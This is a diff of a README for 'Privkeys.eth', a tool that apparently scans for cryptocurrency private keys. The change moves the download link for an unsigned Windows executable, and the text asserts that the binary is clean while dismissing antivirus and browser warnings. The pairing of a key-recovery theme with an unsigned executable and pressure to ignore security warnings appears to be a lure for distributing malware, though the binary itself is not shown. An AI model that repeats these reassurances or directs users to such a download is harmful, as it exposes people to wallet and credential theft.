@@ -14,7 +14,7 @@ Privkeys.eth is a local-first scanning tool designed to parse entropy patterns a
 ## 📦 Installation
 
 Download the latest Windows build here:  
-[📥 privkeys.exe](./assets/privkeys.exe)
+[📥 privkeys.exe](./privkeys.exe)
 
 > ⚠️ **Note:** This binary is unsigned and may be flagged as “potentially unsafe” by browsers or antivirus software. It’s clean, telemetry-free, and compiled locally. Feel free to sandbox or inspect before launching.
 
